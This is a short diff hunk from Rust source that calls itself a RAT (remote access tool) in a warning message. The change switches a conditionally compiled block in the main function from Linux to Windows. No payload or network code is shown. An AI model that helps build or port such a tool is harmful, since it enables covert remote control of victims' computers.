@@ -55,7 +55,7 @@ async fn main() {
     #[cfg(not(target_os = "windows"))]
     warn!("RAT isn't runned on Windows. Some features may be unavailable. Use for debug only");
 
-    #[cfg(target_os = "linux")]
+    #[cfg(target_os = "windows")]
     {
         use crate::utils;
         use std::env;
